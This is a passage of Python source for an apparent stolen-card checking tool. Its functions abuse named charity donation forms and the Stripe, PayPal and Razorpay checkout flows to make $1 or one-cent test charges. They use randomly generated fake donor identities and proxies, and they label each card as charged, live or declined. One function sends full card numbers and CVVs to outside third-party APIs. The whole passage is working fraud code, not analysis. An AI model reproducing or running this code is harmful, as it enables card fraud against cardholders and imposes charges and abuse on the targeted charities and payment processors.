            'give-current-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-minimum': '1', 'give-form-maximum': '1000000', 'give-form-hash': form_hash,
            'give-price-id': '0', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0', 'give-amount': '1', 'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe', 'give_first': first, 'give_last': last, 'give_email': email,
            'card_name': f"{first} {last}", 'give_action': 'purchase', 'give-gateway': 'stripe'
        }
        try:
            async with session.post(final_url, data=donation_data, headers=headers, allow_redirects=True) as resp:
                response_text = await resp.text()
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Donation submission failed: {str(e)}', 'gateway': 'Stripe Donation', 'card': cc_str}
        if response_text.strip().lower() == "ds_required":
            response_text = "3DS_REQUIRED"
        if "Payment Complete: Thank you for your donation" in response_text or "Donation Receipt" in response_text:
            receipt_match = re.search(r"Donation ID\s+([\d]+)", response_text)
            receipt_id = receipt_match.group(1) if receipt_match else "00193"
            return {'status': 'CHARGED', 'message': f'Thank you! Donation ID {receipt_id}', 'gateway': 'Stripe Donation', 'price': '$1.00', 'card': cc_str}
        elif "Your card was declined" in response_text or "card_declined" in response_text:
            return {'status': 'DECLINED', 'message': 'Your card was declined', 'gateway': 'Stripe Donation', 'card': cc_str}
        elif "3d_secure" in response_text.lower():
            return {'status': '3DS_REQUIRED', 'message': '3D Secure required', 'gateway': 'Stripe Donation', 'card': cc_str}
        elif "insufficient funds" in response_text.lower():
            return {'status': 'LIVE', 'message': 'Insufficient funds (card is live)', 'gateway': 'Stripe Donation', 'card': cc_str}
        else:
            return {'status': 'DECLINED', 'message': 'Transaction declined', 'gateway': 'Stripe Donation', 'card': cc_str}

# ================== PAYPAL CHECKER ($1) ==================
async def check_paypal_card(cc_str: str, proxy: dict = None) -> dict:
    """
    PayPal $1 charge via awwatersheds.org (GiveWP + PayPal Commerce).
    Includes shipping address (same as billing) to avoid SHIPPING_ADDRESS_MISSING.
    """
    import re, random, requests, json
    from typing import Optional, Dict

    # ---------- Helper to parse CC ----------
    def parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
        parts = re.split(r'[|:,]', cc_str.strip())
        if len(parts) >= 4:
            cc = parts[0].strip()
            mm = parts[1].strip().zfill(2)
            yy = parts[2].strip()
            cvv = parts[3].strip()
            if len(yy) == 2:
                yy = "20" + yy
            return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
        return None

    # ---------- Random donor data ----------
    FIRST_NAMES = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","William","Elizabeth"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    ADDRESSES = [
        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
    ]
    PHONE_PREFIXES = ["212","310","312"]
    EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com"]

    def random_donor():
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        addr = random.choice(ADDRESSES)
        phone = random.choice(PHONE_PREFIXES) + ''.join(str(random.randint(0,9)) for _ in range(7))
        email = f"{first.lower()}{random.randint(10,9999)}@{random.choice(EMAIL_DOMAINS)}"
        return {"first": first, "last": last, "email": email, "phone": phone, "address": addr}

    # ---------- Card type detection ----------
    def detect_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    # ---------- Synchronous core (runs in executor) ----------
    def charge_sync(cc_num: str, mm: str, yy: str, cvv: str, proxy_str: str = None) -> dict:
        try:
            donor = random_donor()
            session = requests.Session()
            session.verify = True
            if proxy_str:
                if proxy_str.count(':') == 3 and '@' not in proxy_str:
                    p = proxy_str.split(':')
                    fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                    session.proxies = {"http": fmt, "https": fmt}
                elif '@' in proxy_str:
                    session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
                else:
                    session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}

            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            ajax_headers = {
                "User-Agent": ua, "Accept": "*/*",
                "Origin": "https://awwatersheds.org", "Referer": "https://awwatersheds.org/donate/",
                "X-Requested-With": "XMLHttpRequest"
            }

            # 1) Scrape tokens
            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua}, timeout=20)
            if r.status_code != 200:
                return {"status": "ERROR", "msg": f"Page fetch failed: {r.status_code}"}
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                return {"status": "ERROR", "msg": "Hash not found"}
            tokens = {
                "hash": h.group(1),
                "pfx": re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1),
                "id": re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            }

            # 2) Register donation
            reg_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-title": "Sustainers Circle", "give-current-url": "https://awwatersheds.org/donate/",
                "give-form-url": "https://awwatersheds.org/donate/", "give-form-hash": tokens['hash'],
                "give-price-id": "custom", "give-amount": "1.00", "payment-mode": "paypal-commerce",
                "give_first": donor["first"], "give_last": donor["last"], "give_email": donor["email"],
                "give-lake-affiliation": "Other", "give_action": "purchase", "give-gateway": "paypal-commerce",
                "action": "give_process_donation", "give_ajax": "true"
            }
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=reg_data, timeout=20)
            if r.status_code != 200:
                return {"status": "ERROR", "msg": f"Registration failed: {r.status_code}"}

            # 3) Create order
            order_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'], "payment-mode": "paypal-commerce", "give-amount": "1.00",
                "give-gateway": "paypal-commerce"
            }
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                             params={"action": "give_paypal_commerce_create_order"},
                             headers=ajax_headers, data=order_data, timeout=20)
            if r.status_code != 200 or not r.text:
                return {"status": "ERROR", "msg": "Order creation failed: empty response"}
            try:
                order_json = r.json()
            except:
                return {"status": "ERROR", "msg": f"Order creation JSON decode error: {r.text[:100]}"}
            if not order_json.get("success"):
                return {"status": "ERROR", "msg": f"Order creation failed: {order_json}"}
            order_id = order_json["data"]["id"]

            # 4) PayPal GraphQL charge WITH SHIPPING ADDRESS
            full_yy = yy if len(yy) == 4 else f"20{yy}"
            addr = donor["address"]
            billing = {
                "givenName": donor["first"], "familyName": donor["last"],
                "line1": addr["line1"], "line2": None,
                "city": addr["city"], "state": addr["state"],
                "postalCode": addr["zip"], "country": "US"
            }
            # shipping address – same as billing (required)
            shipping = billing.copy()
            graphql_headers = {
                "Host": "www.paypal.com", "Paypal-Client-Context": order_id, "X-App-Name": "standardcardfields",
                "Paypal-Client-Metadata-Id": order_id, "User-Agent": ua, "Content-Type": "application/json",
                "Origin": "https://www.paypal.com", "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
                "X-Country": "US"
            }
            query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags { is3DSecureRequired }
                    cart { intent cartId }
                    paymentContingencies { threeDomainSecure { status method } }
                }
            }
            """
            variables = {
                "token": order_id,
                "card": {
                    "cardNumber": cc_num,
                    "type": detect_type(cc_num),
                    "expirationDate": f"{mm}/{full_yy}",
                    "postalCode": addr["zip"],
                    "securityCode": cvv
                },
                "phoneNumber": donor["phone"],
                "firstName": donor["first"],
                "lastName": donor["last"],
                "email": donor["email"],
                "billingAddress": billing,
                "shippingAddress": shipping,   # ✅ added
                "currencyConversionType": "PAYPAL"
            }
            r = requests.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=graphql_headers,
                json={"query": query, "variables": variables},
                timeout=30
            )
            paypal_text = r.text

            # 5) Approve order on site
            approve_data = {
                "give-honeypot": "", "give-form-id-prefix": tokens['pfx'], "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'], "payment-mode": "paypal-commerce", "give-amount": "1.00",
                "give-gateway": "paypal-commerce"
            }
            r = session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers=ajax_headers,
                data=approve_data,
                timeout=30
            )
            approve_text = r.text

            # 6) Analyze results (same logic)
            t = paypal_text.upper()
            if 'APPROVESTATE":"APPROVED' in t or ('PARENTTYPE":"AUTH' in t and '"CARTID"' in t):
                return {"status": "CHARGED", "msg": "Payment Approved!"}
            if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
                return {"status": "CHARGED", "msg": "Charged!"}
            if 'CVV2_FAILURE' in t or 'INVALID_SECURITY_CODE' in t:
                return {"status": "APPROVED", "msg": "CVV mismatch (Live)"}
            if 'INVALID_BILLING_ADDRESS' in t:
                return {"status": "APPROVED", "msg": "AVS failure (Live)"}
            if 'EXISTING_ACCOUNT_RESTRICTED' in t:
                return {"status": "APPROVED", "msg": "Account restricted (Live)"}
            if 'INSUFFICIENT_FUNDS' in t:
                return {"status": "APPROVED", "msg": "Insufficient funds (Live)"}
            combined = (paypal_text + " " + approve_text).upper()
            declines = [
                ('DO_NOT_HONOR','Do Not Honor'), ('ACCOUNT_CLOSED','Account Closed'),
                ('LOST_OR_STOLEN','Lost/Stolen'), ('EXPIRED_CARD','Expired'),
                ('GENERIC_DECLINE','Declined'), ('SHIPPING_ADDRESS_MISSING','Shipping address missing')
            ]
            for kw, msg in declines:
                if kw in combined:
                    # If the error is SHIPPING_ADDRESS_MISSING, treat as error (not card decline) – but we already fixed it.
                    return {"status": "DECLINED", "msg": msg}
            try:
                rj = json.loads(paypal_text)
                if "errors" in rj:
                    return {"status": "DECLINED", "msg": rj["errors"][0].get("message", "Unknown")}
            except:
                pass
            return {"status": "DECLINED", "msg": "Transaction declined"}
        except Exception as e:
            return {"status": "ERROR", "msg": str(e)[:100]}

    # ---------- Async wrapper ----------
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'PayPal $1', 'price': '$1.00', 'card': cc_str}

    # Extract proxy string from dict if provided
    proxy_str = None
    if proxy and isinstance(proxy, dict):
        http_proxy = proxy.get("http")
        if http_proxy:
            proxy_str = http_proxy.split("://", 1)[-1] if "://" in http_proxy else http_proxy

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, charge_sync, card['number'], card['mm'], card['yy'], card['cvc'], proxy_str)

    # Map status
    status_map = {
        "CHARGED": "CHARGED",
        "APPROVED": "APPROVED",
        "DECLINED": "DECLINED",
        "ERROR": "ERROR",
        "LIVE": "APPROVED"
    }
    final_status = status_map.get(result["status"], "DECLINED")
    return {
        'status': final_status,
        'message': result["msg"],
        'gateway': 'PayPal $1',
        'price': '$1.00',
        'card': cc_str
    }

# ================== PAYPAL2 CHECKER ($0.01) ==================
async def check_paypal2_card(cc_str: str, proxy: dict = None):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
    cc = card['number']
    mes = card['mm']
    ano = card['yy'][-2:]
    cvv = card['cvc']
    try:
        async with AsyncClient(follow_redirects=True, verify=False, proxy=proxy) as session:
            head = {"Host": "www.paypal.com", "referer": "https://ghcop.org/"}
            r = await session.get(
                "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
                headers=head,
            )
            token_match = re.search(r'"facilitatorAccessToken":"([^"]+)"', r.text)
            if not token_match:
                return {'status': 'ERROR', 'message': 'Token not found', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            token = unescape(token_match.group(1))
            head2 = {
                "content-type": "application/json",
                "authorization": f"Bearer {token}",
                "referer": "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
            }
            post2 = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"0.01","breakdown":{"item_total":{"currency_code":"USD","value":"0.01"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"0.01"},"quantity":"1","category":"DONATION"}],"description":"Sachio YT"}],"intent":"CAPTURE","application_context":{}}'
            r2 = await session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2)
            order_id_match = re.search(r'"id":"([^"]+)"', r2.text)
            if not order_id_match:
                return {'status': 'ERROR', 'message': 'Order ID not found', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            order_id = order_id_match.group(1)
            post3 = {
                "query": "mutation payWithCard($token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int) { approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }",
                "variables": {
                    "token": order_id,
                    "card": {"cardNumber": cc, "expirationDate": f"{mes}/{ano}", "postalCode": "10027", "securityCode": cvv},
                    "phoneNumber": "19006318646", "firstName": "Abril", "lastName": "TG",
                    "billingAddress": {"givenName": "Abril", "familyName": "TG", "line1": "118 W 132nd St", "line2": None, "city": "New York", "state": "NY", "postalCode": "10027", "country": "US"},
                    "shippingAddress": {"givenName": "Abril", "familyName": "TG", "line1": "118 W 132nd St", "line2": None, "city": "New York", "state": "NY", "postalCode": "10027", "country": "US"},
                    "email": "abril2040@gmail.com", "currencyConversionType": "PAYPAL",
                },
                "operationName": None,
            }
            head3 = {"content-type": "application/json", "referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token={order_id}"}
            r3 = await session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=head3, json=post3)
            t3 = r3.text
            message_error = re.search(r'"message":"([^"]+)"', t3)
            msg_err = message_error.group(1) if message_error else ''
            code_error = re.search(r'"code":"([^"]+)"', t3)
            code_err = code_error.group(1) if code_error else ''
            response_text = f"{code_err} - {msg_err}" if code_err or msg_err else t3[:100]
            if "is3DSecureRequired" in t3 or "PAYER_CANNOT_PAY" in t3 or "ADD_SHIPPING_ERROR" in t3 or "EXISTING_ACCOUNT_RESTRICTED" in code_err or "INVALID_BILLING_ADDRESS" in code_err or "INVALID_SECURITY_CODE" in code_err or "VALIDATION_ERROR" in code_err:
                return {'status': 'APPROVED', 'message': response_text, 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            else:
                return {'status': 'DECLINED', 'message': response_text, 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}

# ================== RAZORPAY CHECKER (with new API fallback) ==================
async def check_razorpay_card(cc_str: str, site: str = None, proxy: str = None):
    if site is None:
        site = random.choice(RAZORPAY_SITES)
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
    cc_full = f"{card['number']}|{card['mm']}|{card['yy'][-2:]}|{card['cvc']}"

    def determine_status(msg_text):
        msg_lower = msg_text.lower()
        if any(phrase in msg_lower for phrase in ['payment successful', 'thank you', 'charged', 'approved', 'success']):
            return 'CHARGED'
        if any(phrase in msg_lower for phrase in ['insufficient funds', 'live', 'ccn']):
            return 'APPROVED'
        if 'ds_required' in msg_lower:
            ds_required_false = re.search(r'(?<!\w)ds_required\s*[:=]\s*(false|0|no)\b', msg_lower)
            if not ds_required_false:
                return '3DS_REQUIRED'
        return 'DECLINED'

    # Try new API
    new_api_url = f"{RAZORPAY_API_URL_NEW}?cc={cc_full}&url={site}&amount={RAZORPAY_AMOUNT}"
    if proxy:
        new_api_url += f"&proxy={proxy}"
    timeout = aiohttp.ClientTimeout(total=60)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(new_api_url) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                    except Exception:
                        data = {}
                    status_raw = data.get('Status', '')
                    msg = data.get('Response', 'Unknown response')
                    status = determine_status(msg)
                    if 'APPROVED' in status_raw.upper() or 'CHARGED' in status_raw.upper():
                        status = 'CHARGED'
                    elif 'LIVE' in status_raw.upper() or 'CCN' in status_raw.upper():
                        status = 'APPROVED'
                    if status == '3DS_REQUIRED':
                        msg = '3D Secure required'
                    return {
                        'status': status,
                        'message': msg,
                        'gateway': data.get('Gate', 'Razorpay'),
                        'price': f'₹{RAZORPAY_AMOUNT}',
                        'card': cc_str
                    }
    except Exception:
        pass  # fallback to old API

    # Old API
    url = f"{RAZORPAY_API_URL_OLD}?Key={RAZORPAY_API_KEY}&Site={site}&amount={RAZORPAY_AMOUNT}&cc={cc_full}"
    if proxy:
        url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'ERROR', 'message': f'HTTP {resp.status}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
                try:
                    data = await resp.json()
                except Exception:
                    text = await resp.text()
                    return {'status': 'ERROR', 'message': f'Invalid JSON: {text[:100]}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
        status_raw = data.get('status', '')
        msg = data.get('response', 'Unknown response')
        status = determine_status(msg)
        if 'APPROVED' in status_raw.upper() or 'CHARGED' in status_raw.upper():
            status = 'CHARGED'
